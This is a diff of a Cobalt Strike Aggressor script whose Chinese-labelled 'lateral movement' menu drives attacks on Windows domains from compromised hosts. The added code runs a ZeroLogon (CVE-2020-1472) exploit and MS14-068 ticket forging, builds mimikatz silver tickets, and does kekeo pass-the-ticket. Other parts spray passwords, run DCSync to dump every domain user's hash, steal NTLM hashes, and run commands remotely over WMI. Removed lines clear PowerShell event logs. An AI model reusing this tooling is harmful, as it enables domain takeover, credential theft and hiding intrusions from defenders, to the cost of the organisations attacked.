@@ -1,60 +1,41 @@
 menu "☆ 横向移动" {
-    menu "RDP相关" {
-        item "获取 RDP 端口" {
-            local('$bid');
-            foreach $bid ($1){
-            blog($1, "Check Rdp Open Port");
-            bpowershell_import($bid, script_resource("scripts/LateMovement/RDP/RegRdpPort.ps1"));
-            bpowerpick($bid,"RegRdpPort");
-            bshell($bid,"wevtutil cl \"Windows PowerShell\"");
-            }
-        }
-        
-        item "查看RDP是否开启" {
-            blog($1, "请手动执行：shell netstat -ano | findstr \$RDP端口")
-        }
 
-        item "开启 RDP 服务 (注册表)" {
+    menu "IPC 连接"{
+		item "查看本机开启的共享" {
+			blog($1, "\c9========== 查看开启的共享 ==========");
+			bshell($1, "net share");
+		}
+		item "查看指定主机开启的共享" {
+			blog($1, "\c9========== 关闭指定共享 ==========");
+			prompt_text("目标主机IP?", "", lambda({ bshell(@ids, "net view \\\\$1");  }, @ids => $1));
+		}
+		item "查看连接 (本机连接其他机器)" {
+			blog($1, "\c9========== 查看连接(本机连接其他机器) ==========");
+			bshell($1, "net use");
+		}
+		item "查看连接 (其他机器连接本机)" {
+			blog($1, "\c9========== 查看连接(其他机器连接本机) ==========");
+			bshell($1, "net session");
+		}
+        item "与指定主机建立 IPC 连接" {
+            blog($1, "\c9========== 与指定主机建立IPC连接 ==========");
             $bid = $1['@'];
-            bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
-            bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1");
+            $dialog = dialog("与指定主机建立IPC连接", %(bid => $bid), &net_ipc);
+            dialog_description($dialog, "此功能与指定主机建立IPC连接");
+            drow_text($dialog, "ip", "目标主机IP:  ");
+            drow_text($dialog, "username", "用户名:  ");
+            drow_text($dialog, "password", "密码:  ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
         }
-
-        menu "开启RDP服务 (WindowsAPI)" {
-            item "上传StartRdp" {
-                $bid = $1;
-                $dialog = dialog("上传 StartRdp.exe", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &open-3389);
-                dialog_description($dialog, "使用 WindowsAPI 开启 RDP");
-                drow_text($dialog, "UploadPath",  "上传路径: ");
-                dbutton_action($dialog, "上传");
-                dialog_show($dialog);
-                }
-                sub open-3389{
-                bcd($bid, $3['UploadPath']);
-                bupload($bid, script_resource("scripts/LateMovement/RDP/StartRdp.exe"));
-            }
-            item "运行 StartRdp"{
-                bshell($bid, "StartRdp.exe");
-            }
-            item "删除 StartRdp"{
-                local('$bid');
-                foreach $bid ($1){
-                    bshell($1, "taskkill -f /im StartRdp.exe & del /f /s /q StartRdp.exe");
-                    bshell($bid, "del C:\\Windows\\Temp\\StartRdp.exe");
-                }
-            }
+        sub net_ipc {
+            bshell($bid, "net use \\\\$3['ip'] /u:$3['username'] $3['password']");
         }
-
-        item "关闭 RDP 服务" {
-            $bid = $1['@'];
-            bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 1 /f");
-            bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0");
+        item "删除与指定主机建立的IPC连接" {
+            blog($1, "\c9========== 删除与目标ip建立的IPC连接 ==========");
+            prompt_text("目标主机IP?", "", lambda({ bshell(@ids, "net use \\\\$1 /del");  }, @ids => $1));
         }
-        item "SharpRDPThief"{
-            bexecute_assembly($1, script_resource('scripts/LateMovement/RDP/SharpRDPThief/SharpRDPThief.exe'), " ");
-        }
-    }
-
+    }    
     item "NTLM hash"{
         local('$bid');
             foreach $bid ($1){
@@ -62,7 +43,7 @@ menu "☆ 横向移动" {
         }
     }
     sub internal_monologue{
-        $binary = script_resource("/script/LateMovement/InternalMonologue.exe");
+        $binary = script_resource("/scripts/LateMovement/InternalMonologue.exe");
         $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
         beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
         if(!-exists $binary)
@@ -73,23 +54,34 @@ menu "☆ 横向移动" {
         $args = "-Downgrade True -Verbose True";
         bexecute_assembly($1, $binary, $args);
     }	
-
-    item "探测多网卡主机" {
-        $bid = $1['@'];
-        $dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
-        dialog_description($dialog, "OXID 解析器，用于探测多网口机器（依赖于 135 端口）,-i扫描指定ip,-c扫描C段。");
-        drow_combobox($dialog, "type", "type:", @("-i","-c"));
-        drow_text($dialog, "ip", "ip:  ");			
-        dbutton_action($dialog, "运行");
+	item "ZeroLogonBOF" {
+		blog($1, "\c9=========== ZeroLogonBOF ==========");
+        $dialog = dialog("ZeroLogon", %( bid => $1["@"] , Domain => "xstark.sec" , NetBios => "DomainAD" , arch => "x64") ,&ZeroLogon);
+        dialog_description($dialog,"ZeroLogon（CVE-2020-1472）攻击可能导致主机脱域！参考：https://github.com/rsmudge/ZeroLogon-BOF");
+        drow_text($dialog,"Domain","域名:");
+        drow_text($dialog,"NetBios","域控NetBios:");
+        drow_combobox($dialog,"arch","Arch:",@("x64","x86"));
+        dbutton_action($dialog,"Exploit");
         dialog_show($dialog);
-    }
-    sub SharpOXID-Find {
-        $arg = join(' ',  @($3['type'],$3['ip']));
-        bexecute_assembly($bid, script_resource("/script/LateMovement/SharpOXID-Find.exe"), $arg);
+	}
+    sub ZeroLogon{
+        $arch = $3["arch"];
+        $bid = $3["bid"];
+        $fqdn = $3["NetBios"] . "." . $3["Domain"];
+        #read in the right BOF file
+        $handle = openf(script_resource("/scripts/LateMovement/ZeroLogon/zerologon. $+ $arch $+ .o"));
+        $data = readb($handle,-1);
+        closef($handle);
+        # build our arguments
+        $args = bof_pack($bid,"ZZZ",$fqdn,$3["NetBios"],$3["NetBios"] . '$');
+        btask($bid, "Reset  Domain via CVE-2020-1472");
+        # execute it.
+        beacon_inline_execute($bid, $data, "go", $args);
     }	
             
     item "SharpHound3.0" {
-        bexecute_assembly($1, script_resource("/script/LateMovement/SharpHound.exe"), "");
+		blog($1, "\c9=========== SharpHound3.0 ==========");
+        bexecute_assembly($1, script_resource("/scripts/LateMovement/SharpHound.exe"), "");
     }
 
 
@@ -103,7 +95,7 @@ menu "☆ 横向移动" {
 
     sub mimikatz_passthehash{
         $bid = $1;
-        $dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "GLITTER" , user => "administrator" , hash => "hash") , 
+        $dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "XSTARK" , user => "administrator" , hash => "hash") , 
         lambda({
             bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
         }
@@ -118,8 +110,11 @@ menu "☆ 横向移动" {
         dialog_show($dialog);
     }
 
-    menu "Sharpwmi" {
-        item "上传 Sharpwmi" {
+
+
+    menu "SharpWmi" {
+        item "上传 SharpWmi" {
+			blog($1, "\c9=========== 上传 SharpWmi ==========");
             $bid = $1;
             $dialog = dialog("上传sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
             drow_text($dialog, "UploadPath",  "上传路径: "); 	
@@ -129,11 +124,12 @@ menu "☆ 横向移动" {
     sub sharpwmi_up {
 
         bcd($bid, $3['UploadPath']);
-            bupload($bid, script_resource("/script/LateMovement/sharpwmi.exe"));
+            bupload($bid, script_resource("/scripts/LateMovement/sharpwmi.exe"));
         
 
     }
-    item "运行 Sharpwmi"{
+    item "运行 SharpWmi" {
+		blog($1, "\c9=========== 运行 SharpWmi ==========");
         $bid = $1['@'];
         $Dialog = dialog("运行sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
         dialog_description($Dialog, "这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输,目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。");
@@ -155,7 +151,8 @@ menu "☆ 横向移动" {
         $cmd/path = $3['cmd/path'];
         bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
     } 
-    item "删除 Sharpwmi"{
+    item "删除 SharpWmi" {
+		blog($1, "\c9=========== 删除 SharpWmi ==========");
         local('$bid');
         foreach $bid ($1){
             bshell($1, "del /f /s /q sharpwmi.exe");
@@ -163,8 +160,51 @@ menu "☆ 横向移动" {
     }
     }
 
+    menu "Pass The Ticket" {
+        item "Ms14-068 (KB3011780)" {
+			blog($1, "\c9=========== Ms14-068 (KB3011780) ==========");
+            show_message("使用此方法会清除本地凭据!!");
+            $dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "xstark.sec" , user => "administrator" , password => "Admin2012" , user_sid => "域用户SID" , DC_name => "域控") , &Ms14_068);
+            dialog_descrption($dialog,"微软PAC检验不严格导致的漏洞");
+            drow_text($dialog,"Domain","域名:");
+            drow_text($dialog,"user","用户:");
+            drow_text($dialog,"password","密码:");
+            drow_text($dialog,"user_sid","用户SID:");
+            drow_text($dialog,"DC_name","域控名:");
+            dbutton_action($dialog,"Exploit");
+            dialog_show($dialog);   
+        }
+
+        item "Silver-ticket" {
+			blog($1, "\c9=========== Silver-ticket ==========");
+            $dialog = dialog("DomainInfo", %( bid => $1["@"] , Domain => "xstark.sec" , Domain_sid => "xxx" , Target_name => "WIN-Q1E9PO4969I" , target_hash => "xxx" , user => "administrator" , server => "LDAP" ) ,&Silver_DCSync);
+            dialog_description($dialog,"利用白银票据来获得对某一服务的访问权限");
+            drow_text($dialog,"Domain","域名:");
+            drow_text($dialog,"Domain_sid","域SID:");
+            drow_text($dialog,"Target_name","目标机器名:");
+            drow_text($dialog,"target_hash","目标机器Hash:");
+            drow_text($dialog,"user","用户:");
+            drow_combobox($dialog,"server","服务:",@("LDAP","CIFS","HOST","RPCSS","HTTP"));
+            dbutton_action($dialog,"Exploit");
+            dialog_show($dialog);
+
+        }
+
+        item "Import_ticket" {
+			blog($1, "\c9=========== Import_ticket ==========");
+            $dialog = dialog("导如票据文件于此会话中", %( bid => $1["@"] , file => "") ,lambda({
+                bkerberos_ticket_use($3["bid"],$3["file"])
+            }));
+            dialog_description($dialog,"导入票据文件");
+            drow_file($dialog,"file","票据文件:");
+            dbutton_action($dialog,"Exploit");
+            dialog_show($dialog);
+        }
+    }
+
     menu "WMIHACKER" {
         item "上传WMIHACKER" {
+			blog($1, "\c9=========== 上传WMIHACKER ==========");
             $bid = $1;
             $dialog = dialog("上传WMIHACKER", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &WMIHACKER);
             drow_text($dialog, "UploadPath",  "上传路径: "); 	
@@ -174,11 +214,12 @@ menu "☆ 横向移动" {
     sub WMIHACKER {
 
         bcd($bid, $3['UploadPath']);
-            bupload($bid, script_resource("/script/LateMovement/WMIHACKER.vbs"));
+            bupload($bid, script_resource("/scripts/LateMovement/WMIHACKER.vbs"));
         
 
     }
-    item "cmd"{
+    item "cmd" {
+		blog($1, "\c9=========== cmd ==========");
         $bid = $1['@'];
         $Dialog = dialog("WMIHACKER_cmd",%(host => "127.0.0.1", user => "administrator", pass => "password", command => "systeminfo", GETRES => "1 or 0",bid => $bid),&WMIHACKER_cmd);
         dialog_description($Dialog, "");
@@ -190,7 +231,7 @@ menu "☆ 横向移动" {
         dbutton_action($Dialog, "运行");
         dialog_show($Dialog);
     }
-    sub WMIHACKER_cmd{
+    sub WMIHACKER_cmd {
         local('$host $user $pass $command $GETRES');
         $host = $3['host'];
         $user = $3['user'];
@@ -200,7 +241,8 @@ menu "☆ 横向移动" {
         bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
     } 
 
-    item "shell"{
+    item "shell" {
+		blog($1, "\c9=========== shell ==========");
         $bid = $1['@'];
         $Dialog = dialog("WMIHACKER_shell",%(host => "127.0.0.1", user => "administrator", pass => "password", command => "systeminfo", GETRES => "1 or 0",bid => $bid),&WMIHACKER_cmd);
         dialog_description($Dialog, "");
@@ -212,7 +254,7 @@ menu "☆ 横向移动" {
         dbutton_action($Dialog, "运行");
         dialog_show($Dialog);
     }
-    sub WMIHACKER_cmd{
+    sub WMIHACKER_cmd {
         local('$host $user $pass $command $GETRES');
         $host = $3['host'];
         $user = $3['user'];
@@ -222,7 +264,8 @@ menu "☆ 横向移动" {
         bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
     }
 
-    item "upload"{
+    item "upload" {
+		blog($1, "\c9=========== upload ==========");
         $bid = $1['@'];
         $Dialog = dialog("WMIHACKER_upload",%(host => "127.0.0.1", user => "administrator", pass => "password", localpath => "c:\\windows\\system32\\calc.exe", remotepath => "C:\\\$Recycle.Bin",bid => $bid),&WMIHACKER_upload);
         dialog_description($Dialog, "");
@@ -244,7 +287,8 @@ menu "☆ 横向移动" {
         bshell($bid, "cscript WMIHACKER.vbs /upload  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$localpath\"  $+ \"$remotepath\"");
     } 
 
-    item "download"{
+    item "download" {
+		blog($1, "\c9=========== download ==========");
         $bid = $1['@'];
         $Dialog = dialog("WMIHACKER_download",%(host => "127.0.0.1", user => "administrator", pass => "password", localpath => "c:\\calc", remotepath => "c:\\windows\\system32\\calc.exe",bid => $bid),&WMIHACKER_download);
         dialog_description($Dialog, "");
@@ -256,7 +300,7 @@ menu "☆ 横向移动" {
         dbutton_action($Dialog, "运行");
         dialog_show($Dialog);
     }
-    sub WMIHACKER_download{
+    sub WMIHACKER_download {
         local('$host $user $pass $localpath $remotepath');
         $host = $3['host'];
         $user = $3['user'];
@@ -269,7 +313,9 @@ menu "☆ 横向移动" {
 
 
     }
+
     item "枚举域用户密码" {
+		blog($1, "\c9=========== 枚举域用户密码 ==========");
         $bid = $1['@'];
         $dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
         dialog_description($dialog, "枚举域内用户密码（Pass2User指定单个密码-枚举，User2Pass指定单个用户-爆破）。");
@@ -280,15 +326,17 @@ menu "☆ 横向移动" {
     }
     sub SharpDomainSpray {
         $arg = join(' ', @($3['type'],$3['content']));
-        bexecute_assembly($bid, script_resource("/script/LateMovement/SharpDomainSpray.exe"), $arg);
+        bexecute_assembly($bid, script_resource("/scripts/LateMovement/SharpDomainSpray.exe"), $arg);
     } 
 
-    item "获取SPN" {
-        bexecute_assembly($1, script_resource("/script/LateMovement/SPNSearcher.exe"), "");
+    item "获取 SPN" {
+		blog($1, "\c9=========== 获取 SPN ==========");
+        bexecute_assembly($1, script_resource("/scripts/LateMovement/SPNSearcher.exe"), "");
     }
 
-    menu "获取域用户hash" {
+    menu "获取域用户 hash" {
         item "指定用户" {
+		    blog($1, "\c9=========== 指定用户 ==========");
             $dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "域名" , user => "用户") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
             dialog_description($dialog,"使用Mimikatz去获取指定用户的密码Hash");
             drow_text($dialog,"bid","Bid:");
@@ -298,6 +346,7 @@ menu "☆ 横向移动" {
             dialog_show($dialog);
         }
         item "全部用户" {
+			blog($1, "\c9=========== 全部用户 ==========");
             $dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "域名") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
             dialog_description($dialog, "获取全部用户的密码Hash");
             drow_text($dialog, "domain","Domain:");
@@ -308,6 +357,7 @@ menu "☆ 横向移动" {
     }
 
     item "获取域共享" {
+		blog($1, "\c9=========== 获取域共享 ==========");
         $bid = $1['@'];
         $dialog = dialog("获取域共享", %(bid => $bid), &SharpShares);
         dialog_description($dialog, "列出当前域中所有计算机的网络共享信息,也可以将所有计算机名称转换为IP地址。");
@@ -317,8 +367,38 @@ menu "☆ 横向移动" {
     }
     sub SharpShares {
         $arg = join(' ',  @($3['type']));
-        bexecute_assembly($bid, script_resource("/script/LateMovement/SharpShares.exe"), $arg);
+        bexecute_assembly($bid, script_resource("/scripts/LateMovement/SharpShares.exe"), $arg);
     }
             
             
 }
+
+sub pth_injection_Ticket {
+    if ( -is64 $3["bid"] )
+    {
+        bupload($3["bid"], script_resource("/scripts/LateMovement/kekeo/x64/kekeo.exe"));
+    }
+    else
+    {
+        bupload($3["bid"], script_resource("/scripts/LateMovement/kekeo/Win32/kekeo.exe"));
+    }
+    $payload = "kekeo.exe \"tgt::ask /user:" . $3["user"] . " /domain:" . $3["Domain"] . " /ntlm:" . $3["Hash"] . "\" \"exit\"";
+    $file_name = "TGT_" . $3["user"] . "@" . $3["Domain"] . "_krbtgt~" . $3["Domain"] . "@" . $3["Domain"] . ".kirbi";
+    bshell($3["bid"],$payload)
+    bshell($3["bid"],"kekeo.exe \"kerberos::ptt " . $file_name . "\" \"exit\"");
+}
+
+sub Ms14_068 {
+    bupload($3["bid"],script_resource("/scripts/LateMovement/MS14-068.exe"));
+    $payload = "ms14-068.exe -u " . $3["user"] . "@" . $3["Domain"] . " -s " . $3["user_sid"] . " -d " . $3["DC_name"] . "." . $3["Domain"] . " -p " . $3["password"];
+    bmimikatz($3["bid"],"kerberos::purge");
+    bshell($3["bid"],$payload);
+    bmimikatz($3["bid"],"kerberos::ptc TGT_" . $3["user"] . "@" . $3["Domain"] . ".ccache");
+    bshell($3["bid"],"dir \\\\" . $3["DC_name"] . "\\C$");
+}
+
+
+sub Silver_DCSync {
+    $payload = "kerberos::golden /domain:" . $3["Domain"] . " /sid:" . $3["Domain_sid"] . " /target:" . $3["Target_name"] . "." . $3["Domain"] . " /rc4:" . $3["target_hash"] . " /service:" . $3["server"] . " /user:" . $3["user"] . " /ptt";
+    bmimikatz($3["bid"],$payload);
+} 
